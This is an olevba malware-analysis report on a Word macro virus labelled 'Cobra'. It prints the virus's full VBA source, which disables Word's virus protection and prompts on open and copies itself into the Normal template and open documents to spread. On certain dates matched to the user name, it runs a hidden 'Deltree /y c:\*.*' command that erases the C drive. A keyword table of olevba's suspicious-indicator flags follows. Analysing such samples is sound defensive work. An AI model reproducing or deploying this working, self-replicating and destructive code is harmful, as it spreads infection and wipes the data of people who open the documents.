olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.v-3a5f9bf85e3d40be2cc61d20459a85f3670b13f7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.v-3a5f9bf85e3d40be2cc61d20459a85f3670b13f7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cobra.bas 
in file: Virus.MSWord.Cobra.v-3a5f9bf85e3d40be2cc61d20459a85f3670b13f7 - OLE stream: 'Macros/VBA/Cobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 1.0C
Sub AutoOpen()
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    Call DelMac
    Call TempCopy
    Call ADocCopy
    Call DelCDrive
End Sub
Sub DelMac()
On Error Resume Next
Set NTmp = NormalTemplate
    Set ADoc = ActiveDocument
    For i = 1 To NTmp.VBProject.VBComponents.Count
      nm = NTmp.VBProject.VBComponents(i).Name
      If (nm <> "Cobra") And (nm <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NTmp.FullName, _
            Name:=nm, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
    For i = 1 To ADoc.VBProject.VBComponents.Count
        nm = ADoc.VBProject.VBComponents(i).Name
        If (nm <> "ThisDocument") And (nm <> "Cobra") And _
        (nm <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=ADoc.FullName, _
        Name:=nm, Object:=wdOrganizerObjectProjectItems
    End If
    Next i
End Sub
Private Sub TempCopy()
On Error Resume Next
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
    Destination:=NormalTemplate.FullName, Name:="Cobra", _
    Object:=wdOrganizerObjectProjectItems
    Templates(NormalTemplate.FullName).Save
End Sub
Private Sub ADocCopy()
On Error Resume Next
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.FullName, Name:="Cobra", _
    Object:=wdOrganizerObjectProjectItems
End Sub
Private Sub DelCDrive()
On Error Resume Next
    Dim DelOk As Boolean
For i = 1 To 10
If Day(Now) = i And Month(Now) = i Then
        If i <= 4 Then
            If Left(Application.UserName, 1) <= Chr(100) Then
            DelOk = True
            End If
        End If
    If i > 4 And i <= 8 Then
        If Left(Application.UserName, 1) > Chr(100) _
        And Left(Application.UserName, 1) <= Chr(200) Then
        DelOk = True
        End If
    End If
    If i > 8 And i <= 12 Then
        If Left(Application.UserName, 1) > Chr(200) _
        And Left(Application.UserName, 1) <= Chr(255) Then
        DelOk = True
        End If
    End If
End If
Next
    If DelOk = True Then
        Call DelDir
    End If
End Sub
Sub AutoClose()
On Error Resume Next
    TempCopy
    ADocCopy
    If ActiveDocument.Saved = False Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
    End Sub
Sub DelDir()
On Error Resume Next
    Dim MP, MN
    MP = "c:\"
    MN = Dir(MP, vbDirectory)
    Do While MN <> ""
        If MN <> "." And MN <> ".." Then
            If (GetAttr(MP & MN) And vbDirectory) = vbDirectory Then
                If UCase(Left(MN, 1)) = UCase(Left(Application.UserName, 1)) Then
                    Shell "Deltree /y c:\*.*", vbHide
                End If
            End If
        End If
            MN = Dir
    Loop
End Sub
Sub FileNew()
On Error Resume Next
    Call DelMac
    Call TempCopy
    Call ADocCopy
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileExit()
On Error Resume Next
    Call DelMac
    Call TempCopy
    Call ADocCopy
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

